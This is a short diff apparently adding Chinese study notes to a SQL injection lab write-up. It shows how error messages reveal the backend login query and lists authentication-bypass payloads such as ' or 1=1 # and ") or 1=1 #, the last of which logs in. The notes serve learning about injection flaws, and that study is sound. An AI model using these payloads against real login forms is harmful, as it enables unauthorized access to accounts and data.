@@ -302,8 +302,21 @@ mysql> show tables;
 
 `SELECT username, password FROM 用户表 WHERE username="input" and password='input' ;`
 
+1. 验证注入
 
+在username框中输入`admin '`
 
+回显`near ''admin '') and password=('') LIMIT 0,1'`
+
+猜测后台sql语句为`SELECT username, password FROM 用户表 WHERE username=('input') and password=('input')  ;`
+
+2. 注入尝试
+
+输入username: `admin` password: `' or 1=1 #`
+
+回显 `near '") LIMIT 0,1' at line 1` 根据前面学习的知识可以看出来，这里要使用`")`来闭合sql语句
+
+再次尝试`") or 1=1 #` 登录成功
 
 ## SQL数据库的补充知识
 一 基础字符部分
